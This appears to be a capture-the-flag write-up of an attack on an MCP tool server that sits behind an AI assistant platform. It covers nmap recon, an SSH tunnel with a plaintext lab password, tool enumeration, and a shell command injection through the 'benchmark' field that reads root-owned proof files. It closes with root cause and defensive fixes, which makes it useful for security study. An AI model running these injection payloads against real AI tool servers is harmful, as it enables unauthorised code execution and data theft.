## 0) Why this approach
The challenge description points to a custom MCP server behind an AI assistant platform.

## 1) Recon

### Command
```bash
nmap -sC -sV -Pn -p- --min-rate 1200 10.8.0.2
```

### Important finding
Open services included:
- 22/tcp (SSH)
- 443/tcp (web UI)
- 9090/tcp (Uvicorn, MCP)
- 11434/tcp (Ollama service)

Why this matters:

## 2) MCP endpoint verification

### Command
```bash
curl -i http://10.8.0.2:9090/mcp
```

### Observation
Server replied with MCP-style error requiring `text/event-stream`.

Why this matters:
- Confirms this is a real MCP transport endpoint.

## 3) Enumerate tools with mcporter

Because access path was through Kali, we used local tunnel:

```bash
sshpass -p 'kali' ssh -N -L 19090:10.8.0.2:9090 kali@192.168.1.3
```

Then list tools:

```bash
mcporter list http://127.0.0.1:19090/mcp --allow-http --schema --json
```

Discovered tools included:
- `search_knowledge_base`
- `fetch_knowledge_source`
- `run_model_evaluation`
- `query_llm_metrics`
- `check_model_registry`

## 4) Boundary testing each tool

### 4.1 SSRF-style checks on URL fetcher
We tested internal/localhost targets through `fetch_knowledge_source`.

Result:
- Internal/private ranges were blocked.

Why this matters:
- Good control exists there, so likely not the easiest path.

### 4.2 Command injection probing on `run_model_evaluation`
We tested if input is unsafely passed to shell.

Probe command:

```bash
mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
  model_name=smollm2 \
  'benchmark=mmlu;id' \
  subset=all \
  num_samples=1 \
  --output json
```

Result:
- Output showed shell-side behavior, proving injection via `benchmark`.

Why this matters:
- This is direct code execution as the service user/context.

## 5) Exploit to read host proof

We expanded payload to print identity + proof paths:

```bash
mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
  model_name=smollm2 \
  'benchmark=mmlu;echo __START__;whoami;id;uname -a;ls -la /root;cat /root/proof.txt 2>/dev/null;cat /root/flag.txt 2>/dev/null;cat /flag.txt 2>/dev/null;cat /home/local.txt 2>/dev/null;echo __END__' \
  subset=all \
  num_samples=1 \
  --output json
```

Observed evidence in output:
- `whoami` -> `root`
- `uid=0(root)`
- `/root/proof.txt` contents printed

```text
flag_c107872d_c540_4afa_96b0_2c45cf71f116
```

---

## 7) Root Cause (What + Why)

`run_model_evaluation` accepted user-controlled string (`benchmark`) and executed it in a shell context without safe argument handling.

Typical anti-pattern behind this:
- string command composition + shell execution
- no strict allowlist for benchmark values
- no escaping/quoting isolation

So command separators (`;`) broke out of expected logic and ran arbitrary OS commands.

---

## 8) Defensive Fixes
1. Never pass user input into shell command strings.
2. Use safe subprocess invocation with argument arrays (no shell).
3. Strict allowlist for `benchmark` and other enum-like fields.
4. Run service with non-root account.
5. Add runtime egress/exec restrictions + seccomp/apparmor.
6. Add detection for metacharacters and reject malicious input.

---

## 9) Practical Lessons
- Tool enumeration first saved time.
- URL-fetch tool looked tempting but was hardened.
- The real break was parameter injection in a different tool.
- In MCP ecosystems, each tool is its own trust boundary.
